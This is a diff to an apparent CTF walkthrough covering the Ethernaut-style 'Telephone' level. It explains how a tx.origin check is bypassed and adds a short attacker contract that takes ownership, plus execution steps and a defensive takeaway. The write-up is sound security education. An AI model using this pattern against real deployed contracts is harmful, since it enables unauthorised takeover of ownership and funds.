@@ -179,9 +179,86 @@ uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
 
 ---
 
-## ✅ Steps to Reproduce the Hack
+## 🪙 Level 5: Telephone
 
-1. Deploy the CoinFlip contract (from the challenge).
-2. Deploy the Hack contract with the address of the deployed CoinFlip contract.
-3. Call `flip()` from the Hack contract once per block for 10 blocks.
-4. `consecutiveWins` will reach 10, completing the challenge.
+### 🎯 Objective
+
+Become the owner of the Telephone contract.
+
+---
+
+### 🔍 Understanding the Vulnerability
+
+The Telephone contract has a function:
+
+```solidity
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+        owner = _owner;
+    }
+}
+```
+
+- `tx.origin` is the original externally-owned account (EOA) that started the transaction.
+- `msg.sender` is the direct caller of the function.
+- The condition `tx.origin != msg.sender` ensures you cannot call `changeOwner` directly from your wallet, because in that case both values would be the same.
+- However, if you call `changeOwner` through another contract, then:
+  - `tx.origin` will be your wallet address (EOA).
+  - `msg.sender` will be the attacking contract’s address.
+- This makes the condition `tx.origin != msg.sender` true, allowing us to change the owner.
+
+---
+
+### 🛠️ Exploit Strategy
+
+Deploy an attacker contract that:
+- Stores the target Telephone contract address.
+- Calls `changeOwner(msg.sender)` on it.
+- Call the attack function from your wallet so `msg.sender` in the target contract is the attacker contract’s address.
+- This bypasses the `tx.origin` check and sets you as the owner.
+
+---
+
+### 💻 Exploit Code
+
+**HackTelephone.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract HackTelephone {
+    Telephone private immutable telephone;
+
+    constructor(address _telephoneAddress) {
+        telephone = Telephone(_telephoneAddress);
+    }
+
+    function hackTelephone() external {
+        telephone.changeOwner(msg.sender);
+    }
+}
+```
+
+---
+
+### 📝 Step-by-Step Execution
+
+1. **Deploy the HackTelephone contract** with the Telephone contract’s address as a constructor argument.
+2. **Call `hackTelephone()` from your wallet.**
+3. **Verify ownership in the console:**
+   ```js
+   await contract.owner(); // should return your wallet address
+   ```
+
+---
+
+### ⚠️ Key Takeaway
+
+- **Never rely on `tx.origin` for authentication checks.**
+- Always use `msg.sender` to validate the caller, and implement proper access control with `onlyOwner` or similar patterns.
+
+---
+
